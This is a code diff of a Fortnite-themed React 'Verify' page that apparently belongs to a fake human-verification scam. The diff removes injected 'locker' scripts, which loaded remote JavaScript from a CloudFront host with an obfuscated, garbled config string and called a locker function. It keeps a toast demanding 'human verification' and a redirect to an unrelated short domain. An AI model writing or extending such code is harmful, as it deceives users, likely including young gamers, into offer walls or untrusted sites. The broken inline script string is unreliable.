@@ -3,7 +3,7 @@ import { useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/components/ui/use-toast";
 import { motion } from "framer-motion";
-import { ChevronLeft, Lock, CheckCircle, Loader2 } from "lucide-react";
+import { ChevronLeft, Shield, Lock, CheckCircle, Loader2 } from "lucide-react";
 import { IframeModal } from "@/components/IframeModal";
 
 const Verify = () => {
@@ -32,36 +32,21 @@ const Verify = () => {
       });
     }, 100);
 
-    // Dynamically add the locker scripts to the head
-    const script1 = document.createElement("script");
-    script1.type = "text/javascript";
-    script1.innerHTML = 'var DGviuAtXwkNhoZJp2zVewVfh5DpMjucQVKm1dL5csisv"};';
-    document.head.appendChild(script1);
-
-    const script2 = document.createElement("script");
-    script2.src = "https://d2yc6hxtq0phup.cloudfront.net/1a01310.js";
-    document.head.appendChild(script2);
-
     return () => {
-      document.head.removeChild(script1);
-      document.head.removeChild(script2);
+      clearTimeout(timer);
+      clearInterval(interval);
     };
   }, []);
 
-  const handleVerify = () => {
-    toast({
-      title: "Verification Required",
-      description: "Please complete the human verification process.",
-    });
+ const handleVerify = () => {
+  toast({
+    title: "Verification Required",
+    description: "Please complete the human verification process.",
+  });
 
-    // Call the _EQ function to open the locker
-    if (window._EQ) {
-      window._EQ();
-    }
-
-    // Redirecționează utilizatorul pe noul site în aceeași fereastră
-    window.location.href = "https://f9ff.top/68fcad4";
-  };
+  // Redirecționează utilizatorul pe noul site în aceeași fereastră
+  window.location.href = "https://f9ff.top/68fcad4";
+};
 
   return (
     <div className="min-h-screen flex flex-col bg-fortnite-gradient">
@@ -137,7 +122,7 @@ const Verify = () => {
                 animate={{ opacity: 1 }}
                 transition={{ delay: 0.4, duration: 0.5 }}
               >
-                Hello{" "}
+              Hello{" "}
                 <span className="text-fortnite-yellow font-semibold">
                   @{username}
                 </span>
@@ -207,7 +192,6 @@ const Verify = () => {
           </p>
         </div>
       </footer>
-
       <IframeModal
         url={`/api/proxy/${contentPathname}`}
         isOpen={isModalOpen}
